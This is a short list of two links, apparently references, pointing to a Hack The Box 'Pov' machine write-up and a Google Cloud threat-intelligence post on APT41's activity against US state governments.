- https://0xdf.gitlab.io/2024/06/08/htb-pov.html
- https://cloud.google.com/blog/topics/threat-intelligence/apt41-us-state-governments
